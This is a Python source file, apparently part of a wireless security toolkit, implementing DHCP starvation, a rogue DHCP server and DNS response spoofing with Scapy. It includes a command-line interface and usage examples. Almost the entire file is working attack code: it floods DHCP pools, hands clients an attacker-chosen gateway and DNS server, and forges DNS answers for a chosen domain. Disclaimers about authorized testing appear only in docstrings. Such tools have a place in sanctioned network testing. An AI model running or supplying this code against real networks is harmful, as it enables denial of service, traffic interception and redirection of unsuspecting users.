#!/usr/bin/env python3
"""
DHCP and DNS Attack Module for Hoover WiFi Security Toolkit
Tests network resilience against DHCP starvation, rogue DHCP server
spoofing, and DNS spoofing. Verifies whether DHCP snooping, Dynamic
ARP Inspection (DAI), and DNS security measures are properly configured.
For authorized security testing and research only.
"""

import sys
import os
import argparse
import json
import random
import threading
import time
from datetime import datetime
from typing import Optional

from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.sendrecv import sniff, sendp, send
from scapy.volatile import RandMAC

from utils import validate_interface, validate_ip, require_root, setup_logging


# DHCP message types
DHCP_DISCOVER = 1
DHCP_OFFER = 2
DHCP_REQUEST = 3
DHCP_ACK = 5

ATTACK_MODES = ("dhcp-starvation", "dhcp-spoof", "dns-spoof", "all")


class DHCPDNSAttack:
    """DHCP/DNS attack toolkit for authorized network resilience testing.

    Supports DHCP pool starvation, rogue DHCP server (DHCP spoofing),
    and DNS response spoofing for testing whether a network has DHCP
    snooping, Dynamic ARP Inspection, and DNS security controls in place.
    """

    def __init__(self, interface: str,
                 attack_mode: str = "dhcp-starvation",
                 target_ip: Optional[str] = None,
                 spoof_domain: Optional[str] = None,
                 spoof_ip: Optional[str] = None,
                 rogue_gateway: Optional[str] = None,
                 rogue_dns: Optional[str] = None,
                 timeout: int = 300,
                 output_dir: str = "captures") -> None:
        self.interface: str = interface
        self.attack_mode: str = attack_mode
        self.target_ip: Optional[str] = target_ip
        self.spoof_domain: Optional[str] = spoof_domain
        self.spoof_ip: Optional[str] = spoof_ip
        self.rogue_gateway: Optional[str] = rogue_gateway
        self.rogue_dns: Optional[str] = rogue_dns
        self.timeout: int = timeout
        self.output_dir: str = output_dir

        self.logger = setup_logging("dhcp_dns_attack")

        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._running: bool = False
        self._start_time: Optional[float] = None

        # Results / findings
        self.leases_requested: int = 0
        self.offers_received: int = 0
        self.offers_sent: int = 0
        self.acks_sent: int = 0
        self.dns_queries_seen: int = 0
        self.dns_responses_sent: int = 0
        self.used_macs: list[str] = []
        self.events: list[dict] = []

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _generate_random_mac(self) -> str:
        """Generate a random MAC address for DHCP starvation.

        Returns:
            A randomized MAC address string (XX:XX:XX:XX:XX:XX).
        """
        mac = str(RandMAC())
        return mac

    def _record_event(self, event_type: str, **data) -> None:
        event = {
            "type": event_type,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        event.update(data)
        with self._lock:
            self.events.append(event)

    # ------------------------------------------------------------------
    # Packet builders
    # ------------------------------------------------------------------

    def _build_dhcp_discover(self, mac: str):
        """Build a DHCP Discover packet with the given source MAC.

        Args:
            mac: Source MAC address to use for the DHCP client.

        Returns:
            Scapy packet: Ether/IP/UDP/BOOTP/DHCP discover.
        """
        xid = random.randint(1, 0xFFFFFFFF)
        ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=self._mac_to_bytes(mac), xid=xid, flags=0x8000)
        dhcp = DHCP(options=[("message-type", "discover"), "end"])
        return ether / ip / udp / bootp / dhcp

    def _build_dhcp_offer(self, discover_pkt, gateway: str, dns: str):
        """Build a DHCP Offer (or Ack) response to a DHCP Discover packet.

        Args:
            discover_pkt: The received DHCP Discover packet.
            gateway: Rogue gateway IP address to offer.
            dns: Rogue DNS server IP address to offer.

        Returns:
            Scapy packet: Ether/IP/UDP/BOOTP/DHCP offer.
        """
        try:
            client_mac = discover_pkt[Ether].src
        except Exception:
            client_mac = "ff:ff:ff:ff:ff:ff"

        try:
            xid = discover_pkt[BOOTP].xid
        except Exception:
            xid = random.randint(1, 0xFFFFFFFF)

        offered_ip = self._pick_offer_ip()

        ether = Ether(src=self._get_own_mac(), dst=client_mac)
        ip = IP(src=gateway, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,
            yiaddr=offered_ip,
            siaddr=gateway,
            giaddr="0.0.0.0",
            chaddr=self._mac_to_bytes(client_mac),
            xid=xid,
        )
        dhcp = DHCP(options=[
            ("message-type", "offer"),
            ("server_id", gateway),
            ("lease_time", 43200),
            ("subnet_mask", "255.255.255.0"),
            ("router", gateway),
            ("name_server", dns),
            "end",
        ])
        return ether / ip / udp / bootp / dhcp

    def _build_dns_response(self, query_pkt, spoof_ip: str):
        """Build a forged DNS response for a captured DNS query.

        Args:
            query_pkt: The sniffed DNS query packet.
            spoof_ip: The IP address to return for the query's name.

        Returns:
            Scapy packet: Ether/IP/UDP/DNS forged response.
        """
        eth = query_pkt[Ether]
        ip_layer = query_pkt[IP]
        udp_layer = query_pkt[UDP]
        dns_layer = query_pkt[DNS]

        qname = dns_layer.qd.qname if dns_layer.qd is not None else b""

        ether = Ether(src=eth.dst, dst=eth.src)
        ip = IP(src=ip_layer.dst, dst=ip_layer.src)
        udp = UDP(sport=53, dport=udp_layer.sport)
        dns = DNS(
            id=dns_layer.id,
            qr=1,
            aa=1,
            qd=dns_layer.qd,
            an=DNSRR(rrname=qname, ttl=300, rdata=spoof_ip),
        )
        return ether / ip / udp / dns

    @staticmethod
    def _mac_to_bytes(mac: str) -> bytes:
        try:
            return bytes(int(b, 16) for b in mac.split(":"))
        except Exception:
            return b"\x00" * 6

    def _get_own_mac(self) -> str:
        octets = [0x02] + [random.randint(0x00, 0xFF) for _ in range(5)]
        return ":".join(f"{b:02x}" for b in octets)

    def _pick_offer_ip(self) -> str:
        if self.target_ip:
            return self.target_ip
        octet = random.randint(10, 250)
        return f"10.0.0.{octet}"

    # ------------------------------------------------------------------
    # Attack implementations
    # ------------------------------------------------------------------

    def _dhcp_starvation(self) -> dict:
        """Exhaust the DHCP pool by sending Discover packets with random MACs.

        Returns:
            Dict with the number of leases requested and offers received.
        """
        self.logger.info("Starting DHCP starvation attack on %s", self.interface)
        start = time.time()

        def handle_offer(pkt) -> None:
            if not pkt.haslayer(DHCP):
                return
            msg_type = self._get_dhcp_message_type(pkt)
            if msg_type == DHCP_OFFER:
                with self._lock:
                    self.offers_received += 1
                self._record_event("dhcp_offer_received")

        sniffer_thread = threading.Thread(
            target=lambda: self._safe_sniff(
                filter_bpf="udp and (port 67 or port 68)",
                handler=handle_offer,
                timeout=self.timeout,
            ),
            daemon=True,
        )
        sniffer_thread.start()

        while not self._stop_event.is_set():
            if time.time() - start >= self.timeout:
                break
            mac = self._generate_random_mac()
            self.used_macs.append(mac)
            discover = self._build_dhcp_discover(mac)
            try:
                sendp(discover, iface=self.interface, verbose=False)
                with self._lock:
                    self.leases_requested += 1
                self._record_event("dhcp_discover_sent", mac=mac)
            except Exception as e:
                self.logger.debug("Failed to send DHCP discover: %s", e)
            if self._stop_event.wait(timeout=0.1):
                break

        self._stop_event.set()
        sniffer_thread.join(timeout=5)

        return {
            "attack_mode": "dhcp-starvation",
            "leases_requested": self.leases_requested,
            "offers_received": self.offers_received,
            "unique_macs_used": len(self.used_macs),
        }

    def _dhcp_spoof(self) -> dict:
        """Listen for DHCP Discover packets and respond with a rogue offer/ack.

        Returns:
            Dict with the number of offers and acks sent.
        """
        self.logger.info(
            "Starting DHCP spoofing (rogue server) attack on %s", self.interface
        )
        gateway = self.rogue_gateway or "10.0.0.1"
        dns = self.rogue_dns or gateway

        def handle_discover(pkt) -> None:
            if not pkt.haslayer(DHCP):
                return
            msg_type = self._get_dhcp_message_type(pkt)
            if msg_type == DHCP_DISCOVER:
                offer = self._build_dhcp_offer(pkt, gateway, dns)
                try:
                    sendp(offer, iface=self.interface, verbose=False)
                    with self._lock:
                        self.offers_sent += 1
                    self._record_event("rogue_offer_sent")
                except Exception as e:
                    self.logger.debug("Failed to send rogue offer: %s", e)
            elif msg_type == DHCP_REQUEST:
                ack = self._build_dhcp_offer(pkt, gateway, dns)
                try:
                    sendp(ack, iface=self.interface, verbose=False)
                    with self._lock:
                        self.acks_sent += 1
                    self._record_event("rogue_ack_sent")
                except Exception as e:
                    self.logger.debug("Failed to send rogue ack: %s", e)

        self._safe_sniff(
            filter_bpf="udp and (port 67 or port 68)",
            handler=handle_discover,
            timeout=self.timeout,
        )

        return {
            "attack_mode": "dhcp-spoof",
            "rogue_gateway": gateway,
            "rogue_dns": dns,
            "offers_sent": self.offers_sent,
            "acks_sent": self.acks_sent,
        }

    def _dns_spoof(self) -> dict:
        """Sniff DNS queries for the target domain and send forged responses.

        Returns:
            Dict with the number of DNS queries seen and spoofed responses sent.
        """
        self.logger.info("Starting DNS spoofing attack on %s", self.interface)
        if not self.spoof_domain or not self.spoof_ip:
            self.logger.error(
                "dns-spoof requires both spoof_domain and spoof_ip"
            )
            return {
                "attack_mode": "dns-spoof",
                "error": "spoof_domain and spoof_ip are required",
                "dns_queries_seen": 0,
                "dns_responses_sent": 0,
            }

        target_domain = self.spoof_domain.lower().rstrip(".")

        def handle_query(pkt) -> None:
            if not pkt.haslayer(DNS):
                return
            dns_layer = pkt[DNS]
            if dns_layer.qr != 0 or dns_layer.qd is None:
                return

            with self._lock:
                self.dns_queries_seen += 1

            try:
                qname = dns_layer.qd.qname
                if isinstance(qname, bytes):
                    qname = qname.decode("utf-8", errors="replace")
                qname = qname.lower().rstrip(".")
            except Exception:
                return

            if qname != target_domain:
                return

            response = self._build_dns_response(pkt, self.spoof_ip)
            try:
                sendp(response, iface=self.interface, verbose=False)
                with self._lock:
                    self.dns_responses_sent += 1
                self._record_event("dns_response_spoofed", qname=qname)
                self.logger.info(
                    "Spoofed DNS response for %s -> %s", qname, self.spoof_ip
                )
            except Exception as e:
                self.logger.debug("Failed to send spoofed DNS response: %s", e)

        self._safe_sniff(
            filter_bpf="udp port 53",
            handler=handle_query,
            timeout=self.timeout,
        )

        return {
            "attack_mode": "dns-spoof",
            "spoof_domain": self.spoof_domain,
            "spoof_ip": self.spoof_ip,
            "dns_queries_seen": self.dns_queries_seen,
            "dns_responses_sent": self.dns_responses_sent,
        }

    @staticmethod
    def _get_dhcp_message_type(pkt) -> Optional[int]:
        try:
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == "message-type":
                    return int(opt[1])
        except Exception:
            pass
        return None

    def _safe_sniff(self, filter_bpf: str, handler, timeout: Optional[int]) -> None:
        try:
            sniff(
                iface=self.interface,
                filter=filter_bpf,
                prn=handler,
                store=0,
                stop_filter=lambda _p: self._stop_event.is_set(),
                timeout=timeout,
            )
        except Exception as e:
            if not self._stop_event.is_set():
                self.logger.error("Sniffer error: %s", e)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> dict:
        """Main entry point: run the configured attack mode.

        Returns:
            Dict describing the results of the attack run(s).
        """
        if not validate_interface(self.interface):
            self.logger.error("Invalid interface: %s", self.interface)
            return {"error": f"Invalid interface: {self.interface}"}

        if self.attack_mode not in ATTACK_MODES:
            self.logger.error("Invalid attack mode: %s", self.attack_mode)
            return {"error": f"Invalid attack mode: {self.attack_mode}"}

        self._running = True
        self._start_time = time.time()
        self._stop_event.clear()

        results: dict = {"interface": self.interface, "attack_mode": self.attack_mode}

        try:
            if self.attack_mode == "dhcp-starvation":
                results["dhcp_starvation"] = self._dhcp_starvation()
            elif self.attack_mode == "dhcp-spoof":
                results["dhcp_spoof"] = self._dhcp_spoof()
            elif self.attack_mode == "dns-spoof":
                results["dns_spoof"] = self._dns_spoof()
            elif self.attack_mode == "all":
                results["dhcp_starvation"] = self._dhcp_starvation()
                if not self._stop_event.is_set():
                    results["dhcp_spoof"] = self._dhcp_spoof()
        finally:
            self._running = False

        results["elapsed_seconds"] = round(time.time() - self._start_time, 2)
        self.save_results()
        return results

    def save_results(self) -> Optional[str]:
        """Save attack findings as a JSON file in output_dir.

        Returns:
            Path to the saved file, or None if nothing was saved.
        """
        with self._lock:
            has_data = bool(
                self.leases_requested or self.offers_received
                or self.offers_sent or self.acks_sent
                or self.dns_queries_seen or self.dns_responses_sent
                or self.events
            )
        if not has_data:
            return None

        try:
            os.makedirs(self.output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(
                self.output_dir, f"dhcp_dns_attack_{timestamp}.json"
            )
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(self.get_status(), f, indent=2)
            self.logger.info("Results saved to %s", filepath)
            return filepath
        except Exception as e:
            self.logger.error("Failed to save results: %s", e)
            return None

    def get_status(self) -> dict:
        """Return current state and findings of the attack.

        Returns:
            Dict with running state, attack mode, and all collected counters.
        """
        elapsed = 0.0
        if self._start_time is not None:
            elapsed = time.time() - self._start_time

        with self._lock:
            return {
                "running": self._running,
                "interface": self.interface,
                "attack_mode": self.attack_mode,
                "elapsed_seconds": round(elapsed, 2),
                "leases_requested": self.leases_requested,
                "offers_received": self.offers_received,
                "offers_sent": self.offers_sent,
                "acks_sent": self.acks_sent,
                "dns_queries_seen": self.dns_queries_seen,
                "dns_responses_sent": self.dns_responses_sent,
                "unique_macs_used": len(self.used_macs),
                "events": list(self.events),
            }

    def stop(self) -> None:
        """Stop the running attack."""
        self._stop_event.set()
        self._running = False
        self.logger.info("Stopping DHCP/DNS attack")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="DHCP/DNS Attack - Test DHCP starvation, rogue DHCP "
                    "server, and DNS spoofing resilience",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # DHCP pool starvation
  sudo python3 dhcp_dns_attack.py -i wlan0 -m dhcp-starvation -t 120

  # Rogue DHCP server
  sudo python3 dhcp_dns_attack.py -i wlan0 -m dhcp-spoof \\
      --rogue-gateway 10.0.0.1 --rogue-dns 10.0.0.1

  # DNS spoofing
  sudo python3 dhcp_dns_attack.py -i wlan0 -m dns-spoof \\
      --spoof-domain example.com --spoof-ip 10.0.0.1

  # Run starvation then rogue DHCP server
  sudo python3 dhcp_dns_attack.py -i wlan0 -m all

Note: For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless or wired interface to use")
    parser.add_argument("-m", "--mode", dest="attack_mode",
                        choices=ATTACK_MODES, default="dhcp-starvation",
                        help="Attack mode (default: dhcp-starvation)")
    parser.add_argument("--target-ip",
                        help="Target IP to use/offer during attacks")
    parser.add_argument("--spoof-domain",
                        help="Domain name to spoof DNS responses for")
    parser.add_argument("--spoof-ip",
                        help="IP address to return in spoofed DNS responses")
    parser.add_argument("--rogue-gateway",
                        help="Rogue gateway IP to offer via DHCP spoofing")
    parser.add_argument("--rogue-dns",
                        help="Rogue DNS server IP to offer via DHCP spoofing")
    parser.add_argument("-t", "--timeout", type=int, default=300,
                        help="Attack duration in seconds (default: 300)")
    parser.add_argument("-o", "--output-dir", default="captures",
                        help="Directory to save results (default: captures)")

    args = parser.parse_args()
    require_root()

    if args.spoof_ip and not validate_ip(args.spoof_ip):
        print(f"Invalid spoof IP: {args.spoof_ip}")
        sys.exit(1)
    if args.rogue_gateway and not validate_ip(args.rogue_gateway):
        print(f"Invalid rogue gateway IP: {args.rogue_gateway}")
        sys.exit(1)
    if args.rogue_dns and not validate_ip(args.rogue_dns):
        print(f"Invalid rogue DNS IP: {args.rogue_dns}")
        sys.exit(1)
    if args.target_ip and not validate_ip(args.target_ip):
        print(f"Invalid target IP: {args.target_ip}")
        sys.exit(1)

    attack = DHCPDNSAttack(
        interface=args.interface,
        attack_mode=args.attack_mode,
        target_ip=args.target_ip,
        spoof_domain=args.spoof_domain,
        spoof_ip=args.spoof_ip,
        rogue_gateway=args.rogue_gateway,
        rogue_dns=args.rogue_dns,
        timeout=args.timeout,
        output_dir=args.output_dir,
    )

    results = attack.start()
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
